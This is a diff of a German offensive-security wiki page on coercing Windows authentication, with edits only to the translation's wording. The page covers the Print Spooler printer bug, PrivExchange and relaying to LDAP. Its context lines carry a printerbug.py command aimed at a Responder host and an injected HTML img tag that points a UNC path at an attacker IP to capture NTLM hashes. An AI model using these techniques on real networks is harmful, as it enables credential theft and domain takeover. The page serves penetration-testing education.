@@ -8,8 +8,8 @@
 
 ## Missbrauch des Spooler-Dienstes
 
-Wenn der _**Print Spooler**_ Dienst **aktiviert** ist, können Sie einige bereits bekannte AD-Anmeldeinformationen verwenden, um beim Druckserver des Domänencontrollers eine **Aktualisierung** über neue Druckaufträge anzufordern und ihm einfach zu sagen, dass er die Benachrichtigung an ein **beliebiges System** **senden** soll.\
-Beachten Sie, dass der Drucker die Benachrichtigung an beliebige Systeme senden muss, und dafür muss er sich gegen dieses **System** **authentifizieren**. Daher kann ein Angreifer den _**Print Spooler**_ Dienst dazu bringen, sich gegen ein beliebiges System zu authentifizieren, und der Dienst wird in dieser Authentifizierung das **Computer-Konto** verwenden.
+Wenn der _**Print Spooler**_ Dienst **aktiviert** ist, können Sie einige bereits bekannte AD-Anmeldeinformationen verwenden, um beim Druckserver des Domänencontrollers eine **Aktualisierung** neuer Druckaufträge anzufordern und ihm einfach zu sagen, dass er die **Benachrichtigung an ein beliebiges System** senden soll.\
+Beachten Sie, dass der Drucker die Benachrichtigung an beliebige Systeme senden muss, und dafür muss er sich **gegenüber** diesem **System** **authentifizieren**. Daher kann ein Angreifer den _**Print Spooler**_ Dienst dazu bringen, sich gegenüber einem beliebigen System zu authentifizieren, und der Dienst wird in dieser Authentifizierung das **Computer-Konto** verwenden.
 
 ### Finden von Windows-Servern in der Domäne
 
@@ -28,7 +28,7 @@ Sie können rpcdump.py auch unter Linux verwenden und nach dem MS-RPRN-Protokoll
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
-### Fordern Sie den Dienst an, sich gegen einen beliebigen Host zu authentifizieren
+### Fordern Sie den Dienst auf, sich gegen einen beliebigen Host zu authentifizieren
 
 Sie können [**SpoolSample von hier**](https://github.com/NotMedic/NetNTLMtoSilverTicket)** kompilieren.**
 ```bash
@@ -41,7 +41,7 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 ### Kombination mit Unbeschränkter Delegation
 
-Wenn ein Angreifer bereits einen Computer mit [Unbeschränkter Delegation](unconstrained-delegation.md) kompromittiert hat, könnte der Angreifer **den Drucker dazu bringen, sich bei diesem Computer zu authentifizieren**. Aufgrund der unbeschränkten Delegation wird das **TGT** des **Computerkontos des Druckers** im **Speicher** des Computers mit unbeschränkter Delegation **gespeichert**. Da der Angreifer bereits diesen Host kompromittiert hat, wird er in der Lage sein, **dieses Ticket abzurufen** und es auszunutzen ([Pass the Ticket](pass-the-ticket.md)).
+Wenn ein Angreifer bereits einen Computer mit [Unbeschränkter Delegation](unconstrained-delegation.md) kompromittiert hat, könnte der Angreifer **den Drucker zwingen, sich bei diesem Computer zu authentifizieren**. Aufgrund der unbeschränkten Delegation wird das **TGT** des **Computerkontos des Druckers** im **Speicher** des Computers mit unbeschränkter Delegation **gespeichert**. Da der Angreifer diesen Host bereits kompromittiert hat, wird er in der Lage sein, **dieses Ticket abzurufen** und es auszunutzen ([Pass the Ticket](pass-the-ticket.md)).
 
 ## RCP Zwangs-Authentifizierung
 
@@ -53,7 +53,7 @@ https://github.com/p0dalirius/Coercer
 
 Der `PrivExchange`-Angriff ist das Ergebnis eines Fehlers, der in der **Exchange Server `PushSubscription`-Funktion** gefunden wurde. Diese Funktion ermöglicht es, dass der Exchange-Server von jedem Domänenbenutzer mit einem Postfach gezwungen wird, sich bei einem beliebigen vom Client bereitgestellten Host über HTTP zu authentifizieren.
 
-Standardmäßig läuft der **Exchange-Dienst als SYSTEM** und erhält übermäßige Berechtigungen (insbesondere hat er **WriteDacl-Berechtigungen auf der Domäne vor dem 2019 Cumulative Update**). Dieser Fehler kann ausgenutzt werden, um die **Weiterleitung von Informationen zu LDAP zu ermöglichen und anschließend die NTDS-Datenbank der Domäne zu extrahieren**. In Fällen, in denen die Weiterleitung zu LDAP nicht möglich ist, kann dieser Fehler dennoch verwendet werden, um sich bei anderen Hosts innerhalb der Domäne weiterzuleiten und zu authentifizieren. Die erfolgreiche Ausnutzung dieses Angriffs gewährt sofortigen Zugriff auf den Domänenadministrator mit jedem authentifizierten Domänenbenutzerkonto.
+Standardmäßig läuft der **Exchange-Dienst als SYSTEM** und erhält übermäßige Berechtigungen (insbesondere hat er **WriteDacl-Berechtigungen auf der Domäne vor dem kumulativen Update 2019**). Dieser Fehler kann ausgenutzt werden, um die **Weiterleitung von Informationen zu LDAP zu ermöglichen und anschließend die NTDS-Datenbank der Domäne zu extrahieren**. In Fällen, in denen die Weiterleitung zu LDAP nicht möglich ist, kann dieser Fehler dennoch verwendet werden, um sich bei anderen Hosts innerhalb der Domäne weiterzuleiten und zu authentifizieren. Die erfolgreiche Ausnutzung dieses Angriffs gewährt sofortigen Zugriff auf den Domänenadministrator mit jedem authentifizierten Domänenbenutzerkonto.
 
 ## Innerhalb von Windows
 
@@ -98,7 +98,7 @@ und wenn er es öffnet, wird er versuchen, sich zu authentifizieren.
 
 ### MitM
 
-Wenn Sie einen MitM-Angriff auf einen Computer durchführen und HTML in eine Seite injizieren können, die er visualisieren wird, könnten Sie versuchen, ein Bild wie das folgende in die Seite einzufügen:
+Wenn Sie einen MitM-Angriff auf einen Computer durchführen und HTML in eine Seite injizieren können, die er visualisieren wird, könnten Sie versuchen, ein Bild wie das folgende in die Seite zu injizieren:
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
